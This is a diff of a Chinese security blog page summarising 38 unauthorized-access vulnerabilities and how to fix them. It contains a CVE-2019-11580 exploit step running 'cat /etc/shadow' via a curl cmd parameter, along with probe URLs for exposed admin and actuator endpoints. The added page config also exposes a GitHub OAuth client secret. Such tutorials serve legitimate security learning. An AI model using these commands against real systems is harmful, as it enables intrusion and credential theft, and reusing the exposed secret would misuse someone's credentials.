@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>常用的38种未授权访问漏洞汇总 - bysec</title><meta name="Description" content="bysec个人博客"><meta property="og:url" content="http://localhost:1313/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">
+    <title>常用的38种未授权访问漏洞汇总 - bysec</title><meta name="Description" content="bysec个人博客"><meta property="og:url" content="https://www.bysec.cn/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">
   <meta property="og:site_name" content="bysec">
   <meta property="og:title" content="常用的38种未授权访问漏洞汇总">
   <meta property="og:description" content="bysec个人博客">
@@ -16,16 +16,16 @@
     <meta property="article:modified_time" content="2024-10-06T19:59:39+08:00">
     <meta property="article:tag" content="总结">
     <meta property="article:tag" content="未授权访问">
-    <meta property="og:image" content="http://localhost:1313/logo.png">
+    <meta property="og:image" content="https://www.bysec.cn/logo.png">
 
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:image" content="https://www.bysec.cn/logo.png">
   <meta name="twitter:title" content="常用的38种未授权访问漏洞汇总">
   <meta name="twitter:description" content="bysec个人博客">
 <meta name="application-name" content="bysec">
 <meta name="apple-mobile-web-app-title" content="bysec">
 
-<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://q.qlogo.cn/headimg_dl?dst_uin=1726946232&amp;spec=640"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" /><link rel="prev" href="http://localhost:1313/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/" /><link rel="next" href="http://localhost:1313/%E5%B7%A5%E5%85%B7/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://q.qlogo.cn/headimg_dl?dst_uin=1726946232&amp;spec=640"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bysec.cn/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" /><link rel="prev" href="https://www.bysec.cn/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/" /><link rel="next" href="https://www.bysec.cn/%E5%B7%A5%E5%85%B7/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -35,9 +35,9 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "http:\/\/localhost:1313\/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB\/"
-        },"genre": "posts","keywords": "总结, 未授权访问","wordcount":  10784 ,
-        "url": "http:\/\/localhost:1313\/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB\/","datePublished": "2024-10-06T19:59:39+08:00","dateModified": "2024-10-06T19:59:39+08:00","publisher": {
+            "@id": "https:\/\/www.bysec.cn\/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB\/"
+        },"genre": "posts","keywords": "总结, 未授权访问","wordcount":  10682 ,
+        "url": "https:\/\/www.bysec.cn\/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB\/","datePublished": "2024-10-06T19:59:39+08:00","dateModified": "2024-10-06T19:59:39+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
@@ -167,7 +167,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="https://www.bysec.cn/" title="Author" target="_blank" rel="noopener noreferrer author" class="author">bysec</a>
                 </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw"></i>学习</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-10-06">2024-10-06</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-10-06">2024-10-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 10784 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-10-06">2024-10-06</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-10-06">2024-10-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 10682 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 22 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -610,8 +610,8 @@
 <p><strong>漏洞检测</strong></p>
 <p>1、端口扫描</p>
 <p>2、未授权访问kali测试命令</p>
-<p>curl 192.168.126.130:5984</p>
-<p>curl 192.168.126.130:5984/_config</p>
+<p><code>curl 192.168.126.130:5984</code></p>
+<p><code>curl 192.168.126.130:5984/\_config</code></p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg">
         <img
             
@@ -711,7 +711,7 @@
 <p><strong>漏洞检测</strong></p>
 <ul>
 <li><strong>端口扫描</strong></li>
-<li><strong>Kali****连接主机</strong></li>
+<li><strong>Kali连接主机</strong></li>
 </ul>
 <p>（1）kali安装redis-cli远程连接工具</p>
 <div class="highlight"><div class="chroma">
@@ -785,11 +785,17 @@
 </ol>
 <p>修改 redis.conf 文件，添加</p>
 <p><code>requirepass  mypasswd</code></p>
-<p>3、在需要对外开放的时候修改默认端口（端口不重复就可以）</p>
+<ol start="3">
+<li>在需要对外开放的时候修改默认端口（端口不重复就可以）</li>
+</ol>
 <p><code>port 2344</code></p>
-<p>4、以低权限运行 Redis 服务（重启redis才能生效）</p>
+<ol start="4">
+<li>以低权限运行 Redis 服务（重启redis才能生效）</li>
+</ol>
 <p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
-<p>5、最后还可以配合iptables限制开放</p>
+<ol start="5">
+<li>最后还可以配合iptables限制开放</li>
+</ol>
 <h2 id="12-weblogic-未授权访问7001" class="headerLink">
     <a href="#12-weblogic-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae7001" class="header-mark"></a>12. Weblogic 未授权访问（7001）</h2><p><strong>漏洞简介</strong></p>
 <p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。</p>
@@ -847,7 +853,7 @@
 <p><code>docker-compose up -d</code></p>
 <p>3、环境启动后，没有配置身份认证，可以未授权访问到Hadoop YARN ResourceManager WebUI页面。</p>
 <p>http://192.168.126.130:8088/</p>
-<p><a href="http://192.168.126.130:8088/cluster" target="_blank" rel="noopener noreferrer">http://192.168.126.130:8088/cluster</a></p>
+<p>http://192.168.126.130:8088/cluster</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg">
         <img
             
@@ -1007,7 +1013,7 @@
 <ol start="2">
 <li>检测</li>
 </ol>
-<p>（1）端口：8080 <a href="http://10.10.4.89:8080/" target="_blank" rel="noopener noreferrer">http://10.10.4.89:8080/</a></p>
+<p>（1）端口：8080 http://10.10.4.89:8080/</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg">
         <img
             
@@ -1068,8 +1074,8 @@
 <ol>
 <li>使用vulhub搭建漏洞演示环境</li>
 </ol>
-<p>cd /vulhub/jupyter/notebook-rce</p>
-<p>docker-compose up -d</p>
+<p><code>cd /vulhub/jupyter/notebook-rce</code></p>
+<p><code>docker-compose up -d</code></p>
 <ol start="2">
 <li>
 <p>端口扫描</p>
@@ -1254,9 +1260,9 @@
 </li>
 </ol>
 <p>默认账号密码都是guest</p>
-<p><a href="http://10.10.4.89:15672/" target="_blank" rel="noopener noreferrer">http://10.10.4.89:15672</a></p>
-<p>http://10.10.4.89:15692</p>
-<p>http://10.10.4.89:25672</p>
+<p>http://10.10.4.89:15672
+http://10.10.4.89:15692
+http://10.10.4.89:25672</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg">
         <img
             
@@ -1368,31 +1374,12 @@
 <p>Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问。</p>
 <p><strong>漏洞检测</strong></p>
 <p>直接在网站的url中后加上：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/druid/index.htm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/druid/websession.htm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/druid/datasource.htm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/druid/sql.htm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/druid/spring.html
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p>
+<p><code>/druid/index.htm</code>
+<code>/druid/websession.htm</code>
+<code>/druid/datasource.htm</code>
+<code>/druid/sql.htm</code>
+<code>/druid/spring.html</code></p>
+<p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p>
 <p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg">
         <img
             
@@ -1436,9 +1423,9 @@
 <li>直接访问相关路径：</li>
 </ol>
 <p>http://10.2.20.48/actuator/autoconfig</p>
-<p><a href="http://10.2.20.48/env" target="_blank" rel="noopener noreferrer">http://10.2.20.48 /actuator/env</a></p>
+<p>http://10.2.20.48/actuator/env</p>
 <p>http://10.2.20.48/actuator/dump</p>
-<p><a href="http://10.2.20.48/actuator/headdump" target="_blank" rel="noopener noreferrer">http://10.2.20.48/actuator/headdump</a>可下载</p>
+<p>http://10.2.20.48/actuator/headdump</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg">
         <img
             
@@ -1452,7 +1439,7 @@
 <li>actuator未直接部署在IP根目录下</li>
 </ol>
 <p>使用burpsuite的插件：APIKit</p>
-<p>介绍：<a href="https://www.bilibili.com/read/cv15912732" target="_blank" rel="noopener noreferrer">https://www.bilibili.com/read/cv15912732</a></p>
+<p>介绍：https://www.bilibili.com/read/cv15912732</p>
 <p>介绍：https://blog.csdn.net/qq_50854790/article/details/122894291</p>
 <p><strong>漏洞修复</strong></p>
 <ul>
@@ -1856,7 +1843,7 @@
 <p><strong>漏洞检测</strong></p>
 <ol>
 <li>
-<p>目录扫描：/pma   或者 /phpmyadmin</p>
+<p>目录扫描：/pma 或者 /phpmyadmin</p>
 </li>
 <li>
 <p>漏洞URL：http://ip:888/pma</p>
@@ -1903,13 +1890,13 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/jas502n/CVE-2019-11580
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git clone https://github.com/jas502n/CVE-2019-11580
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">cd CVE-2019-11580/
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2019-11580/
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">python CVE-2019-11580.py http://192.168.18.138:8095
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
+</span></span><span class="line"><span class="cl">curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd<span class="o">=</span>cat%20/etc/shadow
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>漏洞修复</strong></p>
@@ -1946,7 +1933,7 @@
     <a href="#38-thinkadminv6%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>38. ThinkAdminV6未授权访问漏洞</h2><p><strong>环境部署</strong></p>
 <p>略。</p>
 <p><strong>漏洞复现</strong></p>
-<p>可参考<a href="https://www.cnblogs.com/cn-gov/p/13715861.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/cn-gov/p/13715861.html</a></p>
+<p>可参考 <a href="https://www.cnblogs.com/cn-gov/p/13715861.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/cn-gov/p/13715861.html</a></p>
 <h2 id="归纳补充" class="headerLink">
     <a href="#%e5%bd%92%e7%ba%b3%e8%a1%a5%e5%85%85" class="header-mark"></a>归纳补充</h2><p><strong>本人补充：批量检测漏洞思路（史上最经典）</strong></p>
 <ul>
@@ -1992,7 +1979,9 @@
     <div class="post-nav"><a href="/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/" class="prev" rel="prev" title="比较有意思的几个漏洞挖掘记录"><i class="fas fa-angle-left fa-fw"></i>比较有意思的几个漏洞挖掘记录</a>
             <a href="/%E5%B7%A5%E5%85%B7/" class="next" rel="next" title="工具集">工具集<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
-</article></div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2015 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.bysec.cn/" target="_blank" rel="noopener noreferrer">bysec</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备2024294125号</a></span></div>
@@ -2006,8 +1995,8 @@
         </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
             <i class="fas fa-comment fa-fw"></i>
         </a>
-    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
-        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":null,"findAllMatches":null,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":null,"ignoreLocation":null,"isCaseSensitive":null,"location":null,"maxResultLength":10,"minMatchCharLength":null,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":null,"type":"fuse","useExtendedSearch":null},"twemoji":true};</script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"gitalk":{"admin":["CNbysec"],"clientID":"Ov23li64ijr3L89wsfoj","clientSecret":"a291b75ee7aaf91f94e71d89a39cf8098ee8ed80","id":"2024-10-06T19:59:39+08:00","owner":"CNbysec","repo":"CNbysec.github.io","title":"常用的38种未授权访问漏洞汇总"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":null,"findAllMatches":null,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":null,"ignoreLocation":null,"isCaseSensitive":null,"location":null,"maxResultLength":10,"minMatchCharLength":null,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":null,"type":"fuse","useExtendedSearch":null},"twemoji":true};</script><script type="text/javascript" src="/lib/gitalk/gitalk.min.js"></script><script type="text/javascript" src="/js/gitalk.min.js" defer></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
 </body>
 
 </html>
